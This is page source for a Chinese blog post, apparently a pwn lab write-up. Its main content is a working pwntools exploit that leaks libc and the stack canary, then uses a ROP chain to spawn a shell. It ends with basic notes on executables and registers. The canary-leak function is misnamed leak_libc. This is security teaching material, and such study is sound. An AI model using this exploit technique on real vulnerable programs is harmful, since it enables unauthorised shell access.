import X from 'src/component/X';
import metas from 'src/app/_metas';

const path = '/24c/pwn-lab-202407/';
export const {metadata} = metas[path];

export default function Post() {
    return (
        <>
            <X.TOC />
            <X.Title>{metas[path].title}</X.Title>
            <X.H1>T1（例题）</X.H1>
            <X.H2>环境</X.H2>
            <X.P>测试环境如下，提示需要替换`libc`。</X.P>
            <X.Image src="T1-1.jpg" width="381px" />
            <X.P>在`/week1`下执行：</X.P>
            <X.CodeBlock
                language="bash"
                code={`
                git clone https://github.com/matrix1001/glibc-all-in-one.git
                cd glibc-all-in-one
                python3 update_list
                cat list
                `}
            />
            <X.P>本题所需环境是`2.23-0ubuntu11.3_amd64`：</X.P>
            <X.CodeBlock
                language="text"
                code={`
                ./download 2.23-0ubuntu11.3_amd64
                `}
            />
            <X.P>使用`patchelf`替换。（对另外两个题目也要做同样处理）</X.P>
            <X.CodeBlock
                language="bash"
                code={`
                cd ../hw1
                patchelf --set-interpreter ../glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so hw1
                patchelf --set-rpath ../glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 hw1
                `}
            />
            <X.Image src="T1-2.jpg" width="1161px" />
            <X.H2>分析</X.H2>
            <X.P>看一下IDA还原的C代码：</X.P>
            <X.Image src="T1-3.jpg" width="717px" invertInDarkTheme />
            <X.P>`See_something`函数打印了参数的地址：</X.P>
            <X.Image src="T1-4.jpg" width="583px" invertInDarkTheme />
            <X.P>栈帧分析：</X.P>
            <X.CodeBlock
                language="text"
                code={`
                [rbp-0x48] - [rbp-0x41] : __int64 v4
                [rbp-0x40] - [rbp-0x31] : char buf[16]
                [rbp-0x30] - [rbp-0x09] : char v6[40]
                [rbp-0x08] - [rbp-0x01] : __int64 v7
                `}
            />
            <X.H2>利用</X.H2>
            <X.P>
                大致思路：先利用程序输出泄露`libc`地址，便于计算出`libc`中`system`函数的地址，用于后续构造ROP链；然后泄露栈上的`canary`，绕过栈保护机制；最后构造`payload`获取`shell`。
            </X.P>
            <X.CodeBlock
                language="python"
                code={`
                from pwn import *

                context.terminal = ["tmux", "splitw", "-h"]
                context.arch = "amd64"
                context.os = "linux"
                context.binary = "./hw1"

                def leak_libc(elf, p, libc):
                    pass

                def leak_canary(p):
                    pass

                def exp(libc, p, canary):
                    pass

                if __name__ == "__main__":
                    elf = context.binary
                    p = process("./hw1")
                    libc = ELF("../libc-2.23.so")

                    leak_libc(elf, p, libc)
                    canary = leak_canary(p)
                    exp(libc, p, canary)
                `}
            />
            <X.P>利用`See_something(v4)`输出地址内容来泄露`libc`地址：</X.P>
            <X.CodeBlock
                language="python"
                code={`
                def leak_libc(elf, p, libc):
                    p.sendlineafter(b"Name:", str(elf.got["printf"]))
                    p.recvuntil(b"address : ")
                    leaked_printf_address = int(p.recvline().strip(),16)
                    libc.address = leaked_printf_address - libc.sym["printf"]

                    # 验证
                    success(f"leaked libc: {hex(libc.address)}") # leaked libc: 0x73962f000000
                    success(f"real libc: {hex(p.libc.address)}") # real libc: 0x73962f000000
                `}
            />
            <X.P>
                获取`canary`，对`buf`的读入有溢出，只要发送`56`字节的数据就能完全覆盖`buf`和`v6`，然后在`printf("hello
                %s")`中泄露`v7`也就是`canary`。
            </X.P>
            <X.CodeBlock
                language="python"
                code={`
                def leak_libc(elf, p, libc):
                    p.sendlineafter(b"ID:", b"a" * 56)
                    p.recvuntil(b"a" * 56 + b"\\n")
                    canary = u64(p.recv(7).rjust(8, b"\\0"))
                    success(f"leaked canary: {hex(canary)}")
                    return canary
                `}
            />
            <X.P>下一个`read`函数是对`v6`读入`0x100uLL`字节，也是明显溢出；构造`payload`为：</X.P>
            <X.CodeBlock
                language="text"
                code={`
                40 padding（覆盖v6）+
                08 canary （覆盖canary，即v7）+
                08 padding（覆盖saved rbp）+
                rop
                `}
            />
            <X.CodeBlock
                language="python"
                code={`
                def exp(libc, p, canary):
                    rop = ROP(libc)
                    rop.call(libc.sym["system"], [next(libc.search("/bin/sh\\0")), 0, 0])

                    payload = b"a" * 40 + p64(canary)
                    payload = payload.ljust(56, b"a") + rop.chain()
                    success(f"payload: {payload}")
                    print(p.recv())
                    p.sendline(payload)
                    p.interactive()
                `}
            />
            <X.H1>T2</X.H1>
            <X.H2>分析</X.H2>
            <X.Image src="T2-1.jpg" width="669px" invertInDarkTheme />
            <X.Image src="T2-2.jpg" width="584px" invertInDarkTheme />
            <X.P>没有`canary`，</X.P>
            <X.P>栈帧分析：</X.P>
            <X.CodeBlock
                language="text"
                code={`
                [rbp-0x30] - [rbp-0x09] : char buf[40]
                [rbp-0x08] - [rbp-0x01] : __int64 v5
                `}
            />
            <X.H1>其他记录</X.H1>
            <X.H2>从C代码到可执行文件</X.H2>
            <X.Uli>源程序：`hello.c`（文本）</X.Uli>
            <X.Uli>经过*预处理*：得到`hello.i`（文本）</X.Uli>
            <X.Uli>经过*编译器*：得到`hello.s`（文本）</X.Uli>
            <X.Uli>经过*汇编器*：得到`hello.o`（二进制）</X.Uli>
            <X.Uli>经过*链接器*：得到`hello`（二进制）</X.Uli>
            <X.H2>可执行文件</X.H2>
            <X.H3>什么是可执行文件？</X.H3>
            <X.Uli>狭义：只包含机器码的文件（如`.out`、`.exe`）</X.Uli>
            <X.Uli>广义：数据是可执行代码的文件（如`.py`）</X.Uli>
            <X.H3>可执行文件的分类</X.H3>
            <X.P>Windows：`PE(Portable Executable)`</X.P>
            <X.Uli>可执行程序：`.exe`</X.Uli>
            <X.Uli>动态链接库：`.dll`</X.Uli>
            <X.Uli>静态链接库：`.lib`</X.Uli>
            <X.P>
                Linux：`ELF(Executable and Linkable Format)`
            </X.P>
            <X.Uli>可执行程序：`.out`</X.Uli>
            <X.Uli>动态链接库：`.so`</X.Uli>
            <X.Uli>静态链接库：`.a`</X.Uli>
            <X.H2>一些寄存器</X.H2>
            <X.Uli>`RIP`：存放下一条要执行指令的（偏移）地址</X.Uli>
            <X.Uli>`RBP`：`Base Pointer`，栈帧基址指针，指向当前函数的栈帧的基址</X.Uli>
            <X.Uli>`RSP`：`Stack Pointer`，栈指针，指向栈顶</X.Uli>
            <X.Uli>`RAX`：通用寄存器，存放函数返回值</X.Uli>
        </>
    );
}
